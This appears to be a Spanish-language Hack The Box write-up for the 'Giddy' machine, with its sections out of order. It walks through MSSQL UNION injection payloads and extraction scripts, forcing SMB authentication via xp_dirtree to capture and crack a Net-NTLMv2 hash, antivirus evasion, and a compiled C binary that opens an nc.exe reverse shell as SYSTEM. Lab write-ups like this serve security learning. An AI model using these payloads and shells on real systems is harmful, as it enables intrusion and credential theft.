el propio Windows Defender o incluso de alg√∫n App Locker. Se pone linda la cosa ya que tendremos que bypassear alguno (o todos) de ellos :) ‚Ä¶ Bypasseamos Antivirus, Windows Defender, App Locker y lo que se venga üîó: Fail con Phantom EvasionBuscando y buscando encontramos finalmente un recurso que hace referencia a otro recurso y ese otro recurso habla de otro recurso, ese √∫ltimo se llama Phantom Evasion, una herramienta para eso, evadir cositas como los antivirus.  Esta parte es de aprendizaje en cuanto a la herramienta porque al final la explote de otro modo :P Hay varios recursos que hablan de ella:  YT - Evasi√≥n de antivirus con Phantom Evasion.  C√≥mo evadir protecci√≥n antivirus con Phantom Payloads. Despu√©s de descargarlo, en su ejecuci√≥n la interfaz es sencilla: Obviaremos algunas opciones, vamos a irnos por el n√∫mero 1 directamente: Ac√° (podemos jugar con la primera, lo hice de todas las maneras posibles, pero F) seleccionamos la segunda opci√≥n, o sea escribimos 2, esta opci√≥n nos generar√≠a un binario que al ser ejecutado con √©xito devolver√≠a una falsa shell, es funcional para saber que tenemos ejecuci√≥n de comandos y que estamos bypasseando el antivirus y los diferentes bloqueos que existan. Entonces, seleccionamos la opci√≥n 2, nos devolver√° la info inicial del binario a generar y empezara a preguntarnos algunas opciones, las importantes van a ser:  LHOST: Nuestra IP, 10. 10. 14. 5.  LPORT: El puerto donde vamos a estar en escucha, 4433.  Strip executable?: Indicamos la letra Y, para SIIIIIIIIIIIIIIIIIIIIII e. e Esto hace que el binario no sea tan pesado.  La opci√≥n del certificado me daba errores, as√≠ que la cambie por n y ya todo perfecto.  Insert output filename: taskkill. Que ser√° el nombre del binario, en la opci√≥n anterior por default esta la extensi√≥n exe, as√≠ que tamos bien. Nos responde: [&gt;] Generating code. . . [&gt;] Compiling. . . [&gt;] Strip binary. . . [&lt;&gt;] File saved in Phantom-Evasion folderY si revisamos el directorio donde ejecutamos phantom evasion vemos el binario taskkill. exe: ‚ù± file taskkill. exe taskkill. exe: PE32 executable (GUI) Intel 80386 (stripped to external PDB), for MS WindowsListooones, pues ahora intentemos subirlo y jugar con el servicio, pero claro, si a√∫n no estamos en escucha por el puerto del binario (4433) lo hacemos: ‚ù± nc -lvp 4433Subimos el binario, lo primero que vemos es que no nos lo borra, as√≠ que puede ser el bueno, encendemos y apagamos el servicio y cruzamos los dedos de los pies a ver si logramos algo: Es trivial cuantos warning nos va a mostrar :P peeeeeeeeeeeeeeero en cualquier momento vemos estoooooooooooooo: Si si siiiiiii, recibimos una petici√≥n, por lo tanto hemos bypasseado tooooooodo todito. Pero (siempre hay peros, ihsss) no podemos hacer nada con ese payload, lo bueno es que confirmamos a phantom evasion como funcional, ahora solo nos quedar√≠a probar entre sus opciones y ver cu√°l nos puede devolver una verdadera shell‚Ä¶ Pero (de nuevo un peroooooo), como ya comente antes, prob√© y prob√© y nada, no logre hacer funcionar una shell‚Ä¶ ‚Ä¶ En este punto ya estaba loco locooooooo, no sab√≠a pa onde mirar, as√≠ que necesitaba un momento de calmita, de respirar profundo y organizar ideas. Despu√©s de un rato, ca√≠ en cuenta de algo en lo que deb√≠ haber pensado desde el inicio, pero bueno, no pasa nada, aprendimos sobre la herramienta phantom evasion. Y s√≠ nos creamos nosotros mismos un binario llamado taskkill. exe que haga lo que queramos? u. u jajaj ‚Ä¶ Pos s√≠, d√©mosle a esa idea, podemos apoyarnos del lenguaje de programaci√≥n C y su funci√≥n system();, simplemente para compilar el script a un formato v√°lido en Windows usamos la herramienta mingw-w64. A darleeeee: Entonces, si no tenemos ni idea, una b√∫squeda r√°pida en internet nos dar√° vaaarios ejemplos como base:  C Exercises: Invoke the command processor to execute a command. Lo tomamos y nos quedamos √∫nicamente con las librer√≠as, la funci√≥n main y la funci√≥n system: #include&lt;stdio. h&gt;#include&lt;stdlib. h&gt;int main () {  system();} Donde system tendr√° lo que queramos ejecutar a nivel de sistema, para no hacer m√°s largo el writeup voy a hacer un spoiler, si no quieres verlo, NO OPRIMAS LO DE ABAJO e. e  SPOILER resoluci√≥n final  El script y el binario generado van a ser la salvaci√≥n e. e (esto no era lo que iba a escribir, pero pues me gusto, as√≠ que ah√≠ se queda). Como prueba anterior, sub√≠ el binario nc. exe a la m√°quina a ver si tambi√©n era borrado, pero no, no lo borra el sistema, as√≠ que podemos indicarle al script que tome ese binario y nos haga una Reverse Shell de toda la vida: #include&lt;stdio. h&gt;#include&lt;stdlib. h&gt;int main () {  system( c:\\Users\\Stacy\\Videos\\nc. exe 10. 10. 14. 5 4433 -e cmd. exe );} Ya con el script finalizado lo compilamos, siguiendo este hilo lo logramos:  How to compile executable for Windows with GCC with Linux Subsystem?. Inicialmente lo compilare para 64 bits si no nos sirve, pues lo intentamos con 32: ‚ù± x86_64-w64-mingw32-gcc taskkill. c -o taskkill. exe‚ù± file taskkill. exe taskkill. exe: PE32+ executable (console) x86-64, for MS WindowsListo, ahora simplemente subimos tooodo, nos ponemos en escucha por el puerto 4433 yyyyyy jugamos con el servicio: ‚Ä¶  Me tire tooooooooodo lo que relacione a Ruby por instalar una herramienta que nos ayudaba con el Bypass de AV. (Y pues se fue a la p*** el evil-winrm asdjflkajsldkf√±l)  Ya lo arregl√©, tamos felices. Por no usar sandboxes o peque√±os entornos que no afecten a las gemas y dem√°s cositas. Algo m√°s aprendido jajajaj a la fuerza pero aprendido. üòá ‚Ä¶ Ahora s√≠, subamos todo a la m√°quina: ‚ù± python3 -m http. server*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; IWR -uri http://10. 10. 14. 5:8000/taskkill. exe -OutFile taskkill. exe*Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; IWR -uri http://10. 10. 14. 5:8000/nc64. exe -OutFile c:\Users\Stacy\Videos\nc. exe‚ù± nc -lvp 4433Detenemos el servicio: *Evil-WinRM* PS C:\ProgramData\\unifi-video&gt; stop-service  Ubiquiti UniFi Video Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop. . . Warning: Waiting for service 'Ubiquiti UniFi Video (UniFiVideoService)' to stop. . . . . . Yyyyyyyyyyyy en nuestro listeneeeeeeeeeeeeeeeeeeeer: PERO CLAROOOOOOOOO QUE SIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII, OMG, mi cerebro respira e. e Tamos dentro del sistema como el usuario nt authority\system, el master de los masters.  Veamos las flags: IT‚ÄôS OOOOOOOOOOOOVER ‚Ä¶ Terminamos despu√©s de un largo camino, pero un camino llen√≠simo de aprendizaje, pr√°cticamente todo lo que vimos en esta m√°quina fue nuevo para m√≠, as√≠ que incre√≠ble, muy lindo lo que hicimos y lo que probamos. Sali√≥ un bello script (que inicialmente no era la idea, iba a ser muuucho m√°s sencillo, pero uff, me encanto), intentamos (lo logramos en gran medida) bypassear el AV, el Windows Defender, el App Locker y lo que se nos interpusiera e. e Muy linda m√°quina, brutalmente llevada a la realidad creo yo, una base de datos con 0 data importante, pero que puede permitir ejecutar comandos SQL y entornos super controlados, pero realmente no tanto, llega un script de visita con dos l√≠neas y destruye todo lo que ten√≠as ‚Äúcontrolado‚Äù :( Bueno basta!! Los dejo descansar y perd√≥n que a veces me extienda o haga cosas que para algunos son obvias, pero esa es la idea, dejar la obviedad de lado y reforzar cositas e incluso dejar que alguien con menos experiencia aprenda algo nuevo. Nos leeremos despu√©s y a seguir rompiendo tooodoooo no jodaaaaaaaaaaaaaaaaaa!! Tenemos algunas cositas relevantes:       Puerto   Servicio   Versi√≥n         80   HTTP   Microsoft IIS httpd 10. 0       443   HTTPS   Microsoft IIS httpd 10. 0   Vemos un commonName muy atractivo:  commonName=PowerShellWebAccessTestWebSiteNos da la idea de tener una Shell en la web, ya veremos.       3389   RDP   Microsoft Terminal Services   Muchas referencias al nombre Giddy (mayusculas y minusculas)  DNS_Computer_Name: GiddyJmmm, pues empecemos a explorar cada puerto y descubramos por donde podemos romperlos. ‚Ä¶ Puerto 80 üîó: Un perrito :D de primeras se me ocurre algo con estenograf√≠a (ojal√° no), pero sigamos explorando‚Ä¶ Hagamos un fuzzeo de directorios a ver si algo se nos escapa de los ojos: ‚ù± dirsearch. py -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories. txt -u http://10. 10. 10. 104. . . Target: http://10. 10. 10. 104/[25:25:25] Starting: [25:25:25] 301 - 157B - /aspnet_client -&gt; http://10. 10. 10. 104/aspnet_client/[25:25:25] 302 - 157B - /remote -&gt; /Remote/default. aspx?ReturnUrl=%2fremote[25:25:25] 301 - 157B - /Aspnet_client -&gt; http://10. 10. 10. 104/Aspnet_client/[25:25:25] 301 - 147B - /mvc -&gt; http://10. 10. 10. 104/mvc/[25:25:25] 301 - 157B - /aspnet_Client -&gt; http://10. 10. 10. 104/aspnet_Client/[25:25:25] 302 - 157B - /Remote -&gt; /Remote/default. aspx?ReturnUrl=%2fRemote[25:25:25] 301 - 157B - /ASPNET_CLIENT -&gt; http://10. 10. 10. 104/ASPNET_CLIENT/[25:25:25] 400 - 324B - /besalu%09[25:25:25] 400 - 324B - /error%1F_log. . . Opaa, encontramos tres rutas:  /aspnet_client.  /remote.  /mvc. Validando cada una, /aspnet_client nos devuelve acceso denegado :( si revisamos /remote, con ella si obtenemos respuesta y caemos ac√°: Perefeto, nos pide varias cosas, pero la principal es que nos movamos al servicio HTTPS, as√≠ que nos movemos a:  https://10. 10. 10. 104/remoteY conseguimos el mismo output, pero sin el error del SSL (: Juguemos con el login a ver‚Ä¶  Windows PowerShell Web Access (que llamaremos PSWA): ‚Äúacts as a Windows PowerShell gateway, providing a web-based Windows PowerShell console that is targeted at a remote computer. It enables IT Pros to run Windows PowerShell commands and scripts from a Windows PowerShell console in a web browser, with no Windows PowerShell, remote management software, or browser plug-in installation necessary on the client device. ‚Äù Install and Use Windows PowerShell Web Access.  How to use Microsoft PowerShell Web Access. Intentando algunas cositas como buscar Windows PowerShell Web Access exploit o credenciales por default, no conseguimos nada √∫til. Si nos fijamos ya sea con la extensi√≥n Wappalyzer de Firefox o con la herramienta whatweb vemos algo de asp. net: ‚ù± whatweb https://10. 10. 10. 104/remotehttps://10. 10. 10. 104/remote [302 Found] ASP_NET[4. 0. 30319], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10. 0], IP[10. 10. 10. 104], Microsoft-IIS[10. 0], RedirectLocation[/Remote/default. aspx?ReturnUrl=%2fremote], Title[Object moved], X-Frame-Options[DENY], X-Powered-By[ASP. NET]https://10. 10. 10. 104/Remote/default. aspx?ReturnUrl=%2fremote [302 Found] ASP_NET[4. 0. 30319], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10. 0], IP[10. 10. 10. 104], Microsoft-IIS[10. 0], RedirectLocation[/Remote/en-US/logon. aspx?ReturnUrl=%252fremote], Title[Object moved], X-Frame-Options[DENY], X-Powered-By[ASP. NET]https://10. 10. 10. 104/Remote/en-US/logon. aspx?ReturnUrl=%252fremote [302 Found] ASP_NET[4. 0. 30319], Cookies[. redirect. ], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10. 0], HttpOnly[. redirect. ], IP[10. 10. 10. 104], Microsoft-IIS[10. 0], RedirectLocation[https://10. 10. 10. 104/Remote/en-US/logon. aspx?ReturnUrl=%25252fremote], Title[Object moved], X-Frame-Options[DENY], X-Powered-By[ASP. NET]Contamos con la versi√≥n 4. 0. 30319 de asp. net, buscando cositas en la web con esto tampoco llegamos a nada interesante o relevante :( ‚Ä¶ Veamos la ruta /mvc de la web: Ufff, muchos recursos (si nos fijamos a la derecha del todo a√∫n quedan varios scrolls hacia abajo y todo son links), notamos varias cositas:  Un bot√≥n de registro: http://10. 10. 10. 104/mvc/Account/Register. aspx.  Un bot√≥n de login: http://10. 10. 10. 104/mvc/Account/Login. aspx.  4 botones m√°s, los 4 funcionales:     http://10. 10. 10. 104/mvc/About. aspx.    http://10. 10. 10. 104/mvc/Contact. aspx.    http://10. 10. 10. 104/mvc/Search. aspx.     Los links que hacen referencia a nombres de productos tienen este formato:     http://10. 10. 10. 104/mvc/Product. aspx?ProductSubCategoryId=12, donde 12 puede ser cualquier n√∫mero (o sea, cualquier producto).    Vaya, varias cositas para probar (eso de los productos tiene una cara de SQLi que ufff), pero vamos por orden. Si nos creamos una cuenta, nos inicia sesi√≥n de una. Curiosamente no hay nada distinto a lo que vimos ya. Jugando con el apartado Search. aspx tenemos: Si insertamos algo como &lt;h1&gt;Hola&lt;/h1&gt;, para saber si podemos inyectar c√≥digo HTML nos responde esto: Nos devuelve un error, pero adem√°s de eso vemos varias cositas, como una ruta absoluta y algunas versiones que est√°n siendo usadas con el servicio. Probando algo m√°s interesante como inyectar consultas SQL no logramos nada, usamos estos dos payloads como base, de ellos vamos probando variaciones:       Payload   Descripci√≥n         1 order by 100   As√≠ intentamos determinar cuantas columnas hay en la consulta actual, como ejemplo intentamos 100 columnas, si no existe ese n√∫mero de columnas nos deber√≠a responder con un error, si vemos ese error, sabemos que es vulnerable y debemos empezar a jugar con el 100 hacia abajo para encontrar el n√∫mero de columnas (cuando ya no nos arroje error sabremos que ese ser√° el n√∫mero de columnas).        1 or sleep(5)   Para ver si existe una vulnerabilidad SQL basada en tiempo (si la consulta se demora 5 segundos en responder, sabr√≠amos que es vulnerable).        ;#   Hace referencia a un comentario (hay varias maneras), por lo que le decimos que tome toooooooodo lo que este despu√©s de nuestro payload como comentario para que no interfiera con nuestra explotaci√≥n   Pero lo dicho, jugando con Search. aspx con algunos payloads no llegamos a ning√∫n lado, as√≠ que mov√°monos a los productos. Seleccionamos cualquiera, por ejemplo el 33 que hace referencia a las luces: Bien, si jugamos con las columnas, encontramos algooooooooooooooooooooooo: http://10. 10. 10. 104/mvc/Product. aspx?ProductSubCategoryId=33 order by 100;# 33, 1, 2 o 234, da igual el numero.  Opaaaaaaa, confirmamos inyecci√≥n SQL (: vemos el error que nos indica que 100 est√° fuera de rango del n√∫mero de columnas, as√≠ que debemos empezar a bajar el n√∫mero y ver en que momento dejamos de ver el error.  Tambi√©n vemos las versiones de antes, pero ahora hay una nueva ruta, y esta parecer ser donde residen todos los archivos del servicio web (: sigamos con la SQLi‚Ä¶  Y un nuevo usuario, jnogueira, guardemoslo. ‚Ä¶ Jugamos con la inyecci√≥n SQL #: Encontramos n√∫mero de columnas usando ORDER BY üîó: Moviendo n√∫meros encontramos el l√≠mite: http://10. 10. 10. 104/mvc/Product. aspx?ProductSubCategoryId=33 order by 26;# http://10. 10. 10. 104/mvc/Product. aspx?ProductSubCategoryId=33 order by 25;# Bien, 25 columnas, ahora tenemos que jugar con todas y ver en cu√°l de ellas logramos almacenar valores. Descubrimos en cu√°les podemos almacenar texto üîó:  Ac√° una gu√≠a de lo que debemos hacer - SQL injection UNION attacks. Bien, pues cre√©monos un script superr√°pido que nos haga las 25 iteraciones (25 columnas) cambiando el valor de cada una por alg√∫n texto, si la respuesta del servidor no nos devuelve errores y por el contrario nos devuelve el texto, tendr√≠amos una columna para jugar:  search_column_union. py ‚ù± python3 search_column_union. py [+] Payload: 33 UNION SELECT NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -[+] La columna '2' de nuestro payload nos permite escribir en la web[+] Payload: 33 UNION SELECT NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -[+] La columna '3' de nuestro payload nos permite escribir en la web[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -[+] La columna '6' de nuestro payload nos permite escribir en la web[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -[+] La columna '11' de nuestro payload nos permite escribir en la web[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -[+] La columna '12' de nuestro payload nos permite escribir en la web[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -[+] La columna '13' de nuestro payload nos permite escribir en la web[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -[+] La columna '16' de nuestro payload nos permite escribir en la web[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -[+] La columna '17' de nuestro payload nos permite escribir en la web[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -[+] La columna '18' de nuestro payload nos permite escribir en la webPerfectisimo, ya vemos varios campos, podemos jugar con cualquiera, tomar√© la columna n√∫mero 2 (: Antes de ponernos a dumpear las bases de datos debemos saber contra qu√© servicio SQL estamos enfrent√°ndonos (algunos ya lo sabr√°n por los errores), para esto juguemos con la variable @@version y veamos: Vemos la versi√≥n del servicio SQL üîó: Ya podemos quitarnos el bucle e indicarle donde queremos que juegue, entonces empecemos a generar nuestro script para extraer toda la data, pero lo dicho, primero veamos la versi√≥n y as√≠ saber con qu√© sintaxis tenemos que seguir la explotaci√≥n: 33 UNION SELECT campos_null,ELcampoQUEqueremosVERdeLAdb,los_otros_23_campos_null,. . ,. . ,. . ;-- -Entonces como respuesta, en la web ver√≠amos ELcampoQUEqueremosVERdeLAdb:  extract_data_sqli_errorbased. py Si lo ejecutamos vemos: ‚ù± python3 extract_data_sqli. py -f '@@version'[+] Extrayendo la variable @@version del servicio SQL. [+] @@version:   Microsoft SQL Server 2016 (SP1) (KB3182545) - 13. 0. 4001. 0 (X64)     Oct 28 2016 18:17:30     Copyright (c) Microsoft Corporation    Express Edition (64-bit) on Windows Server 2016 Standard 6. 3 &lt;X64&gt; (Build 14393: ) (Hypervisor)Opa, estamos ante el servicio de bases de datos Microsoft SQL Server, pues ahora sabemos que no podemos usar las mismas sentencias que usamos con MySQL; es mi primer approach contra este servicio y su explotaci√≥n, as√≠ que vamos a darle duro y aprendemos juntos. Investigando encontramos varios recursos, podemos destacar 2:  MSSQL Injection Cheat Sheet.  MSSQL Practical Injection Cheat Sheet.  Step By Step MSSQL Union Based Injection. Vemos algunas variables para probar, intentemos ver el usuario que la base de datos actual: ‚ù± python3 extract_data_sqli. py -f 'user_name()'[+] Extrayendo la variable user_name() del servicio SQL. [+] user_name(): Giddy\stacy‚ù± python3 extract_data_sqli. py -f 'user'[+] Extrayendo la variable user del servicio SQL. [+] user: Giddy\stacy‚ù± python3 extract_data_sqli. py -f 'system_user'[+] Extrayendo la variable system_user del servicio SQL. [+] system_user: giddy\stacyListones, tenemos al usuario stacy para guardarlo en nuestros pensamientos, ahora s√≠, empecemos a explotar estooooooooooooooooooo!! Extraemos las bases de datos actuales del servicio MSSQL üîó: Con ayuda del primer recurso referenciado antes, vemos una manera de extraer todas las bases de datos: Juguemos con la √∫ltima l√≠nea, armemos un bucle por ejemplo de 10 bases de datos y veamos que surge: (Es pr√°cticamente igual a nuestra inyecci√≥n por campos, solo que en esta generamos un bucle para que vaya iterando entre las N bases de datos que existan) 33 UNION SELECT campos_null,DB_NAME(N),los_otros_23_campos_null,. . ,. . ,. . ORDER BY 1;-- -Le indicamos el ORDER BY 1 para que lo que nos devuelva lo posicione en la primera columna (as√≠ nos es m√°s f√°cil jugar con el script).  extract_data_sqli_errorbased. py Ejecutamos yyyyyy: ‚ù± python3 extract_data_sqli. py[+] Extrayendo las bases de datos del servicio MSSQL. [+] Base de datos [0]: Injection[+] Base de datos [1]: master[+] Base de datos [2]: tempdb[+] Base de datos [3]: model[+] Base de datos [4]: msdbBien, 5 bases de datos, juguemos inicialmente con Injection (que tiene un nombre moooooooooooooy llamativo) a ver que tablas tiene: Extraemos las tablas de la base de datos Injection üîó: Ac√° ya empezamos a limitar los resultados a 1 por fila, as√≠ lo √∫nico que debemos hacer es cambiar la fila en la que estamos pero siempre recibiendo un resultado.  S√© que se pudo haber hecho que una sola consulta arrojara tooodo y de ese toooodo extraer las cositas, pero me parecio m√°s sencillo de implementar uno por uno. 33 UNION SELECT CAMPOS_NULL,table_name,LOS_OTROS_23_CAMPOS_NULL,. . ,. . ,. . FROM [nombreDB]. information_schema. tables ORDER BY 1 OFFSET N ROWS FETCH FIRST 1 ROWS ONLY;-- -Donde nos extraer√° el nombre de las tablas que hay en la DB nombreDB, esto obtenido de la consulta information_schema. tables PEEEEEEERO en vez de LIMIT (como MySQL) usamos OFFSET y FETCH para limitar los resultados. Lo que hacemos es decirle:  ‚ÄúHEEEEY, limitame los resultados a solo uno (FETCH FIRST 1 ROWS ONLY) y ve cambiando la fila en la que te encuentras por favor (OFFSET N (donde N va de 0 a 1 a 2 y al numero que sea))‚Äù  Tomado de How to Limit Rows in a SQL Server Result Set.  extract_data_sqli_errorbased. py ‚ù± python3 extract_data_sqli. py --dump Injection[+] Dumpeando tablas de la base de datos 'Injection': ‚úî+----------------------+| Tablas DB: Injection |+----------------------+| CreditCard      || Product       || ProductCategory   || ProductSubcategory  |+----------------------+Jmmm, 4 no m√°s, veamos la tabla CreditCard a ver que columnas tiene: Extraemos las columnas en la tabla CreditCard de la base de datos Injection üîó: Exactamente igual, solo que agregamos contra que tabla queremos trabajar: 33 UNION SELECT CAMPOS_NULL,column_name,LOS_OTROS_23_CAMPOS_NULL,. . ,. . ,. . FROM [nombreDB]. information_schema. columns WHERE table_name='nombreTABLA' ORDER BY 1 OFFSET N ROWS FETCH FIRST 1 ROWS ONLY;-- -Lo √∫nico que cambia es que extraemos las columnas de la DB nombreDB peeero que est√©n relacionadas con la tabla nombreTABLA, nada m√°s.  extract_data_sqli_errorbased. py ‚ù± python3 extract_data_sqli. py --dump Injection CreditCard[+] Dumpeando columnas de la tabla 'CreditCard' en la base de datos 'Injection': ‚úî+--------------+| Columnas   |+--------------+| CardNumber  || CardType   || CreditCardID || ExpMonth   || ExpYear   || ModifiedDate |+--------------+Ninguna columna es llamativa, jmmm, sin embargo intentemos ver alg√∫n valor, por ejemplo el de CardType: Vemos la data de la columna CardType en la tabla CreditCard de la base de datos Injection üîó: Y la m√°s sencilla, solo le indicamos de donde queremos extraer QU√â data. 33 UNION SELECT CAMPOS_NULL,nombreCAMPO,LOS_OTROS_23_CAMPOS_NULL,. . ,. . ,. . FROM [nombreDB]. . nombreTABLA ORDER BY 1 OFFSET %d ROWS FETCH FIRST 1 ROWS ONLY;-- -Sencillito, le decimos: ‚Äúextrae el campo nombreCAMPO de la tabla nombreTABLA que est√° en la DB nombreDB, muchas gracias‚Äù.  extract_data_sqli_errorbased. py ‚ù± python3 extract_data_sqli. py --dump Injection CreditCard CardType[+] Extrayendo valores de la columna 'CardType' en Injection. CreditCard: ‚úî+---------------+| CardType   |+---------------+| ColonialVoice || Distinguish  || SuperiorCard || Vista     |+---------------+Pos si, los tipos de tarjetas de cr√©dito üòë Ahora nos queda movernos entre las bases de datos, sus tablas y columnas a ver en cu√°les encontramos algo √∫til‚Ä¶ ‚Ä¶ Jugando con comandos de MSSQL üîó: Despu√©s de una ardua enumeraci√≥n no encontramos nada de nada :(  Al menos nos sacamos un lindo lindo script. Buscando de que otras maneras podemos aprovecharnos de esta inyecci√≥n, llegamos a esta gran lista de payloads para usar:  PayloadAllTheThings - MSSQL Injection. En √©l hay algunas maneras de ejecutar comandos con la instrucci√≥n xp_cmdshell, pero probando cositas no obtenemos respuestas :( ‚úò Extraemos hash Net-NTLMv2 del usuario Stacy üîó: Si seguimos bajando llegamos al apartado MSSQL UNC Path, el cual nos indica que MSSQL soporta el listado de archivos que existan en un directorio compartido a trav√©s de SMB, esto mediante la instrucci√≥n xp_dirtree. Esto es interesante porque si logramos que el usuario de la base de datos (Stacy) haga la conexi√≥n contra nuestro folder compartido, llegara con ella un hash como m√©todo de autenticaci√≥n, ese hash puede llegar a ser crackeable, pero claro, dependemos de cuan fuerte o no es la contrase√±a que hay por detr√°s.  Explicaci√≥n concreta de los tipos de hashes: LM, NTLM y Net-NTLMv2. Bien, pues compartamos una carpeta, usemos smbclient. py: ‚ù± smbserver. py smbFolder $(pwd)La carpeta compartida se llama smbFolder y toma la ruta actual en la que estemos (: ahora ejecutemos la instrucci√≥n a ver si llega alguna conexi√≥n: ‚ù± python3 extract_data_sqli. py --command  use master; exec xp_dirtree '\\\10. 10. 14. 5\smbFolder' [+] Enviando: . . . =33; use master; exec xp_dirtree '\\10. 10. 14. 5\smbFolder';-- -[+] Listonessss. Si revisamos nuestra carpeta vemos una conexi√≥√≥√≥√≥√≥√≥√≥√≥√≥√≥√≥√≥√≥n: Sip, Stacy hace dos conexiones por lo tanto vemos dos hashes, si nos guiamos del recurso anteriormente citado sabemos que es un hash Net-NTLMv2, podemos jugar con John The Ripper e intentar crackearlo: Lo guardamos en un archivo: ‚ù± cat stacy. hash Stacy::GIDDY:aaaaaaaa:7314d853e80f9b14ffd777487e0ded22:0101000000000000800c43548681d7018508a21f5f6d94bf00000000010010007a007800530076004200560076004300020010004a007800660055004800650073007900030010007a007800530076004200560076004300040010004a00780066005500480065007300790007000800800c43548681d70106000400020000000800300030000000000000000000000000300000483c10b9e519cd8ccad95791e38cd0e00f9987c059e89a051afd94f7f5f7fb820a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003500000000000000000000000000Y ahora con john: ‚ù± john --wordlist=/usr/share/wordlists/rockyou. txt --format=netntlmv2 stacy. hash Pero la respuesta nos deja muertos:  No password hashes loaded (see FAQ) ‚úî Extraemos hash Net-NTLMv2 del usuario Stacy üîó: Jmm F, intentando e intentando cositas no logramos respuesta distinta a esa. Leyendo el post de los hashes hablan de una herramienta llamada responder, la cual (entre muuuchas cosas) tambi√©n nos sirve como intermediario para cuando alguien intenta conectarse o interactuar con nuestro sistema. Intentemos con ella a ver si vemos algo distinto: Al ser la primera vez que lo uso, debemos descargarlo:  Vamos al repo de la tool.  En nuestra terminal hacemos git clone https://github. com/lgandx/Responder. git.  Y ya tendr√≠amos el programa Responder. py, lo renombrar√© a responder. py para que sea m√°s sencillo el llamado (que pereza escribir la primera en mayus üòä)En internet encontramos este recurso que nos muestra como usar Responder para capturar hashes NetNTLM. Si queremos validar el tr√°fico de alguna interfaz, por ejemplo de la tun0, que seria donde esta HTB: ‚ù± ifconfig docker0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt; mtu 1500    . . . eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500    . . . lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536    . . . tun0: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt; mtu 1500    inet 10. 10. 14. 5 netmask 255. 255. 254. 0 destination 10. 10. 14. 5    . . . Y ahora ejecutar√≠amos con el responder que analice el tr√°fico de esa interfaz: ‚ù± responder. py -I tun0 -A Nos desplegara algunas opciones activas o inactivas del programa y al final nos mostrara que esta en escucha por la interfaz tun0: Ahora bien, para capturar el hash de Stacy (que es el user que hace la petici√≥n) debemos quitar el par√°metro -A: ‚ù± responder. py -I tun0Lo siguiente ser√° enviar una petici√≥n desde el servicio MSSQL a nuestra IP servida en la interfaz tun0, o sea, a la 10. 10. 14. 5 y ver que pasa en el responder: ‚ù± python3 extract_data_sqli. py --command  use master; exec xp_dirtree '\\\10. 10. 14. 5' [+] Enviando: . . . =33; use master; exec xp_dirtree '\\10. 10. 14. 5';-- -[+] Listonessss. Yyyyyyyyyyyyy: Bien, tambi√©n obtenemos el hash Net-NTLMv2 de Stacy, hagamos lo mismo de antes, lo tomamos, lo guardamos en un archivo y jugamos con john: ‚ù± john --wordlist=/usr/share/wordlists/rockyou. txt --format=netntlmv2 stacy. hash PERFECTISIIIIIIIIIIIIIIIIIIMO, ahora s√≠ logramos que tome el hash y mejor a√∫n, que lo crackeeeeeeeeeeeeeeeeeeee.  Que locura, lindo lindo‚Ä¶ Si recordamos en nuestro escaneo de nmap, el servicio WinRM por el puerto 5985 esta activo, entre las cosas que podemos hacer con √©l, ah√≠ un recurso que lo aprovecha para generar una consola PowerShell llamado evil-winrm, us√©moslo y de una validemos si las credenciales son funcionales: Listones ahora s√≠, estamos dentro del sistema como el usuario Stacy (: ‚Ä¶ Otra alternativa hubiera sido el usar la interfaz web que encontramos en nuestra enumeraci√≥n web, la recuerdan? Hab√≠a un recurso llamado Remote, si intentamos logearnos con esas credenciales, conseguimos una PowerShell en la web (que va un toque m√°s r√°pida que la que tenemos con evil-winrm):  Con este recurso vemos un ejemplo de 